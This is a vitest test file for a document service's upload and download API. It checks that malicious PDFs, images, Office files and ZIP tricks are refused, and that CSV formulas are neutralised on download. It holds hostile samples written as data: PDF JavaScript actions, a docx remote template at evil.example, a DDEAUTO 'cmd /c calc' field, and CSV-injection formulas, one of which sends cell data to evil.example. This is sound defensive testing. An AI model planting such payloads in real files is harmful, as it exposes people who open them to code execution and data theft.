import { createHash } from 'node:crypto';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { as, auditRows, createUser, login, ownerDb, resetState, startApp, withDb, type Session, type TestApp } from './helpers.js';
import * as B from './fixtures/hostile/build.js';

// The adversarial corpus through the real upload route (THREATS.md C1-C8):
// refused files never reach storage or the scanner; the CSV
// formulas-disabled copy is served without touching the stored bytes.

let t: TestApp;
let A: Session;
let ownerId: string;

beforeAll(async () => {
  t = await startApp();
  await resetState(t.app);
  const alice = await createUser({ email: 'content-alice@t.io', role: 'OWNER' });
  ownerId = alice.id;
  A = await login(t, alice);
});
afterAll(async () => {
  await t.close();
});

const docCount = async () => (await withDb(ownerDb(), (c) => c.query('SELECT count(*)::int AS n FROM documents WHERE owner_id = $1', [ownerId]))).rows[0].n as number;
const sha = (b: Buffer) => createHash('sha256').update(b).digest('hex');

describe('hostile uploads are refused through the API', () => {
  const hostile: [string, Buffer, string][] = [
    ['PDF: JavaScript in a compressed object stream', B.pdf({ catalogExtra: '/OpenAction 5 0 R', extra: [B.objStm(4, [{ num: 5, body: '<</S/JavaScript/JS(app.alert(1))>>' }])] }), 'a.pdf'],
    ['PDF: hex-escaped /J#61vaScript', B.pdf({ catalogExtra: '/OpenAction<</S/J#61vaScript/J#53(x)>>' }), 'a.pdf'],
    ['PDF: annotation AA in an object stream', B.pdf({ pageExtra: '/Annots[5 0 R]', extra: [B.objStm(4, [{ num: 5, body: '<</Type/Annot/Subtype/Widget/Rect[0 0 1 1]/AA<</E<</S/JavaScript/JS(1)>>>>>>' }])] }), 'a.pdf'],
    ['PDF: XFA', B.pdf({ catalogExtra: '/AcroForm 5 0 R', extra: [B.objStm(4, [{ num: 5, body: '<</Fields[]/XFA 6 0 R>>' }])] }), 'a.pdf'],
    ['PDF: embedded file', B.pdf({ catalogExtra: '/Names 5 0 R', extra: [B.objStm(4, [{ num: 5, body: '<</EmbeddedFiles<</Names[]>>>>' }])] }), 'a.pdf'],
    ['PDF: truncated', B.pdf().subarray(0, 120), 'a.pdf'],
    ['PDF + ZIP polyglot', B.pdf({ extra: [B.streamObj(4, '', B.zip([{ name: 'x.txt', data: 'x' }]))] }), 'a.pdf'],
    ['PNG with HTML after IEND', Buffer.concat([B.png(), Buffer.from('<html><script>alert(1)</script></html>')]), 'a.png'],
    ['JPEG with a script appended', Buffer.concat([B.jpeg(), Buffer.from('<script>alert(1)</script>')]), 'a.jpg'],
    ['docx: remote template', B.docx({ docRels: B.relationship('rId9', 'attachedTemplate', 'https://evil.example/t.dotm', true) }), 'a.docx'],
    ['docx: OLE object', B.docx({ extra: [{ name: 'word/embeddings/oleObject1.bin', data: 'x' }] }), 'a.docx'],
    ['docx: ActiveX', B.docx({ extra: [{ name: 'word/activeX/activeX1.xml', data: '<x/>' }] }), 'a.docx'],
    ['docx: DDEAUTO', B.docx({ body: '<w:p><w:r><w:instrText>DDEAUTO cmd "/c calc"</w:instrText></w:r></w:p>' }), 'a.docx'],
    ['xlsx: external link', B.xlsx({ extra: [{ name: 'xl/externalLinks/externalLink1.xml', data: '<externalLink/>' }] }), 'a.xlsx'],
    ['ZIP: central directory and local header disagree', B.docx({}, { localName: { 'word/document.xml': 'word/evil.xml' } }), 'a.docx'],
  ];
  for (const [name, body, file] of hostile) {
    it(`refuses ${name}, stores nothing, and never calls the scanner`, async () => {
      const before = { docs: await docCount(), scans: t.clamd.scans };
      const res = await as(t, A).upload('/api/documents', body, file, { title: 't', category: 'c' });
      expect(res.status, JSON.stringify(res.body)).toBe(400);
      expect(typeof res.body.message).toBe('string');
      expect(await docCount()).toBe(before.docs);
      expect(t.clamd.scans).toBe(before.scans);
    });
  }

  it('accepts ordinary files of each kind', async () => {
    for (const [body, file] of [[B.pdf(), 'a.pdf'], [B.png(), 'a.png'], [B.jpeg(), 'a.jpg'], [B.docx(), 'a.docx'], [B.xlsx(), 'a.xlsx'], [B.pptx(), 'a.pptx']] as const) {
      const res = await as(t, A).upload('/api/documents', body, file, { title: 'ok', category: 'c' });
      expect(res.status, `${file}: ${JSON.stringify(res.body)}`).toBe(201);
    }
  });
});

describe('CSV downloads: original bytes, or a formulas-disabled copy', () => {
  const CSV = Buffer.from('name,amount,note\r\nAlice,-5,=HYPERLINK("https://evil.example/?"&A1;"click")\r\nBob,12,@SUM(1+1)*cmd|\' /C calc\'!A0\r\n');
  let doc: string;
  beforeAll(async () => {
    const res = await as(t, A).upload('/api/documents', CSV, 'payroll.csv', { title: 'Payroll', category: 'Finance' });
    expect(res.status).toBe(201);
    doc = res.body.id;
  });

  it('by default sends the stored bytes unchanged (hash matches the upload) and says how many cells are formulas', async () => {
    const res = await as(t, A).get(`/api/documents/${doc}/download`).buffer(true).parse((r, cb) => { const c: Buffer[] = []; r.on('data', (d: Buffer) => c.push(d)); r.on('end', () => cb(null, Buffer.concat(c))); });
    expect(res.status).toBe(200);
    expect((res.body as Buffer).equals(CSV)).toBe(true);
    expect(res.headers['x-document-sha256']).toBe(sha(CSV));
    expect(res.headers['x-csv-formula-cells']).toBe('2');
    expect(res.headers['content-disposition']).toMatch(/^attachment;/);
    expect(res.headers['content-type']).toMatch(/^text\/csv/);
  });

  it('?variant=formulas-disabled neutralises every formula cell; the stored version is unchanged', async () => {
    const res = await as(t, A).get(`/api/documents/${doc}/download?variant=formulas-disabled`).buffer(true).parse((r, cb) => { const c: Buffer[] = []; r.on('data', (d: Buffer) => c.push(d)); r.on('end', () => cb(null, Buffer.concat(c))); });
    expect(res.status).toBe(200);
    const text = (res.body as Buffer).toString('utf8');
    expect(text).toBe('name,amount,note\r\nAlice,-5,"\'=HYPERLINK(""https://evil.example/?""&A1;""click"")"\r\nBob,12,\'@SUM(1+1)*cmd|\' /C calc\'!A0\r\n');
    expect(res.headers['x-content-variant']).toBe('formulas-disabled');
    expect(res.headers['x-document-sha256']).toBe(sha(CSV)); // identifies the stored version
    expect(res.headers['x-content-sha256']).toBe(sha(res.body as Buffer)); // what was actually sent
    expect(res.headers['content-disposition']).toContain('payroll (formulas disabled).csv');
    // The stored version still verifies.
    const meta = await as(t, A).get(`/api/documents/${doc}`);
    expect(meta.body.versions[0].sha256).toBe(sha(CSV));
    const rows = await auditRows(`document_id = $1 AND action = 'document.download' AND outcome = 'ALLOWED'`, [doc]);
    expect((rows.at(-1)!.details as { variant?: string }).variant).toBe('formulas-disabled');
  });

  it('works for a specific version too', async () => {
    const res = await as(t, A).get(`/api/documents/${doc}/versions/1/download?variant=formulas-disabled`);
    expect(res.status).toBe(200);
    expect(res.headers['x-content-variant']).toBe('formulas-disabled');
  });

  it('refuses the variant for files that are not CSV, and unknown variants', async () => {
    const pdfDoc = (await as(t, A).upload('/api/documents', B.pdf(), 'a.pdf', { title: 'p', category: 'c' })).body.id;
    expect((await as(t, A).get(`/api/documents/${pdfDoc}/download?variant=formulas-disabled`)).status).toBe(400);
    expect((await as(t, A).get(`/api/documents/${doc}/download?variant=raw`)).status).toBe(400);
  });
});
